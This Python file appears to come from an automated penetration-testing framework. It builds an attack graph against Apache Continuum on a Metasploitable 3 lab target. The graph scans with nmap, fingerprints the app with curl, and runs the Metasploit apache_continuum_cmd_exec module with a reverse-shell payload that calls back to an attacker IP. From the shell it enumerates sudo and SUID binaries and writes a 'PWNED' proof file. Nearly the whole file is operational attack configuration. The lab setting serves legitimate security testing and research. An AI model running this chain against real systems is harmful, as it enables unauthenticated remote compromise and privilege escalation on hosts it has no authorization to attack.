"""
Example Attack Graph: Apache Continuum command-injection RCE (Metasploitable 3)

Unauthenticated service-level exploit chain against MS3's Apache Continuum
running on a Jetty server at port 8080. The Continuum installer/build
interface fails to sanitize the project name / build configuration fields,
allowing an unauthenticated attacker to inject shell commands that Jetty
executes -- which Metasploit weaponizes into a one-shot RCE.

Chain:
  recon            — nmap full scan
  fingerprint      — curl the /continuum/ app to confirm it is live on 8080
  continuum_rce    — exploit/multi/http/apache_continuum_cmd_exec -> shell
  privesc_lookup   — id / sudo -l / find SUID enumeration on the new shell
  file_drop        — write proof-of-compromise file and read it back

Expected: clean run lands a command shell via the Continuum command
injection. privesc_lookup reports the shell's privileges so the replanner
can decide whether to escalate or wrap up with file_drop.
"""

from core_agents.attack_graph import (
    AttackGraph, AttackNode, AttackEdge, EdgeCheck,
    EdgeCondition, Tactic,
)


def build_continuum_rce_graph(target_ip: str, attacker_ip: str) -> AttackGraph:

    graph = AttackGraph.create(
        objective="Compromise the Metasploitable 3 target via the Apache "
                  "Continuum command-injection vulnerability on the Jetty "
                  "server at port 8080. Land a command shell, enumerate "
                  "privileges from the shell, and drop a proof-of-compromise "
                  "file.",
        target_ip=target_ip,
        name=f"continuum_rce_{target_ip}",
        attacker_ip=attacker_ip,
        scope=[target_ip],
        description="Apache Continuum command-injection RCE baseline against MS3.",
        metadata={"scenario": "continuum_rce", "target_type": "metasploitable3"},
    )

    # =========================================================================
    # NODES
    # =========================================================================

    graph.add_node(AttackNode(
        id="recon",
        label="Nmap Full Scan",
        tactic=Tactic.RECONNAISSANCE.value,
        technique_id="T1046",
        technique_name="Network Service Discovery",
        agent_type="recon",
        goal="Map the target's attack surface and confirm the web app on 8080",
        objective=f"Full port scan with service versioning on {target_ip}.",
        target_ip=target_ip,
        tool_name="nmap",
        commands_to_run=[f"nmap -sV -p 0-65535 {target_ip}"],
        tags=["nmap", "full_scan"],
    ))

    graph.add_node(AttackNode(
        id="fingerprint",
        label="Fingerprint Apache Continuum App",
        tactic=Tactic.DISCOVERY.value,
        technique_id="T1592.002",
        technique_name="Gather Victim Host Info: Software",
        agent_type="recon",
        goal="Confirm the Apache Continuum app is live on the Jetty server",
        objective=f"Curl the Continuum web app on {target_ip}:8080 to verify "
                  f"it is reachable before firing the exploit.",
        target_ip=target_ip,
        tool_name="ssh",
        commands_to_run=[f"curl -sS -m10 http://{target_ip}:8080/continuum/"],
        max_retries=1,
        tags=["http", "continuum", "fingerprint"],
    ))

    graph.add_node(AttackNode(
        id="continuum_rce",
        label="Apache Continuum Command Injection RCE",
        tactic=Tactic.INITIAL_ACCESS.value,
        technique_id="T1190",
        technique_name="Exploit Public-Facing Application",
        agent_type="exploit",
        goal="Obtain a command shell via the Apache Continuum command injection",
        objective=f"Run exploit/multi/http/apache_continuum_cmd_exec against "
                  f"{target_ip}:8080 with TARGETURI /continuum; payload "
                  f"cmd/unix/reverse.",
        target_ip=target_ip,
        tool_name="metasploit",
        module="exploit/multi/http/apache_continuum_cmd_exec",
        module_options={
            "RHOSTS": target_ip,
            "RPORT": 8080,
            "TARGETURI": "/continuum",
        },
        payload="cmd/unix/reverse",
        payload_options={
            "LHOST": attacker_ip,
            "LPORT": 4453,
        },
        max_retries=3,
        tags=["continuum", "cmd_injection", "rce", "unauth"],
    ))

    graph.add_node(AttackNode(
        id="privesc_lookup",
        label="Enumerate Privesc Vectors from Shell",
        tactic=Tactic.PRIVILEGE_ESCALATION.value,
        technique_id="T1082",
        technique_name="System Information Discovery",
        agent_type="privesc",
        goal="Identify whether the shell can reach root",
        objective="Enumerate id, sudo, SUID binaries, and writable system paths "
                  "from the newly opened session.",
        target_ip=target_ip,
        tool_name="session",
        commands_to_run=[
            "id",
            "whoami",
            "uname -a",
            "sudo -n -l",
            "find / -perm -4000 -type f 2>/dev/null | head -20",
        ],
        max_retries=1,
        tags=["privesc", "enum", "suid"],
    ))

    graph.add_node(AttackNode(
        id="file_drop",
        label="Drop Proof-of-Compromise File",
        tactic=Tactic.IMPACT.value,
        technique_id="T1485",
        technique_name="Data Destruction",
        agent_type="impact",
        goal="Demonstrate compromise with a written artifact",
        objective="Write a proof-of-compromise file via the session and read it back.",
        target_ip=target_ip,
        tool_name="session",
        commands_to_run=[
            "echo '{marker}' > {target_file}",
            "echo \"Compromised at $(date)\" >> {target_file}",
            "echo \"User: $(whoami)\" >> {target_file}",
            "cat {target_file}",
        ],
        command_params={
            "target_file": "/tmp/pwned_continuum.txt",
            "marker": "PWNED via Apache Continuum cmd injection",
        },
        command_params_alternatives={
            "target_file": ["/var/tmp/pwned_continuum.txt"],
        },
        max_retries=3,
        metadata={"target_file": "/tmp/pwned_continuum.txt"},
        tags=["impact", "file_drop", "proof"],
    ))

    # =========================================================================
    # EDGES
    # =========================================================================

    graph.connect(
        "recon", "fingerprint",
        checks=[
            EdgeCheck(
                field="ports", operator="any_port",
                expected={"port": 8080},
                description="Web service is open on 8080",
            ),
        ],
        evidence="Nmap found the web service on port 8080",
        rationale="Confirm the Continuum app is live before firing the exploit",
    )

    graph.connect(
        "fingerprint", "continuum_rce",
        checks=[
            EdgeCheck(
                field="success", operator="equals", expected="True",
                description="Continuum app responded",
            ),
        ],
        evidence="Apache Continuum confirmed live on 8080",
        rationale="Reachable app -- exploit the command injection",
    )

    graph.connect(
        "continuum_rce", "privesc_lookup",
        checks=[
            EdgeCheck(
                field="session_id", operator="exists",
                description="Command shell session opened",
            ),
        ],
        evidence="Got command shell via Apache Continuum cmd injection",
        rationale="Enumerate privesc paths from the new shell",
    )

    graph.connect(
        "privesc_lookup", "file_drop",
        checks=[
            EdgeCheck(
                field="success", operator="equals", expected="True",
                description="Session is usable",
            ),
        ],
        evidence="Session privileges enumerated",
        rationale="Drop the proof-of-compromise file as the impact step",
    )

    return graph


# =============================================================================
# CLI
# =============================================================================

if __name__ == "__main__":
    graph = build_continuum_rce_graph(
        target_ip="192.168.34.7",
        attacker_ip="192.168.34.6",
    )
    print(graph.summary())
    print()

    out_path = "examples/continuum_rce_graph.json"
    graph.save(out_path)
    print(f"Saved to {out_path}")

    loaded = AttackGraph.load(out_path)
    print(f"\nReloaded: {loaded}")
    print(f"Ready nodes: {loaded.ready_nodes()}")
